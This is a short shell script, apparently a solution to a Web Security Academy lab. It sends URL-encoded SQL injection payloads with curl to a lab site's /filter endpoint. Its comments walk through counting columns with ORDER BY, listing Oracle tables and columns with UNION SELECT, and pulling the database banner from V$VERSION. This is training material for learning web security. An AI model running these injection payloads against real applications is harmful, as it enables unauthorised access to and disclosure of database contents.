BASE_URL="https://0a9a0025039e94d4804b08e7008c00d3.web-security-academy.net"
ENDPOINT="/filter"

# The query returns two columns, server error generated for 3. So our query is returning two columns.
# QUERY="category=Lifestyle%27+ORDER+BY+2--"

# This works, returns all table names (but not V_$VERSION)
# QUERY="category=WhoCares%27+UNION+SELECT+table_name%2CNULL+FROM+all_tables--"

# I can use this query to get all column names from all tables,
# I inspected it, it includes "dynamic tables" like V$_VERSION that are not listed in all_tables
# From here I see there is only one column in V_$VERSION named "BANNER"
# QUERY="category=WhoCares%27+UNION+SELECT+table_name%2Ccolumn_name+FROM+all_tab_columns+WHERE+table_name+LIKE+%27%25VERSION%25%27--"

# I needed the column name from V_$VERSION in order to get the data.
# Now that I know it, I can query it directly.
QUERY="category=WhoCares%27+UNION+SELECT+BANNER%2CNULL+FROM+V%24VERSION--"


out=$(curl "${BASE_URL}${ENDPOINT}?${QUERY}")
echo "$out"
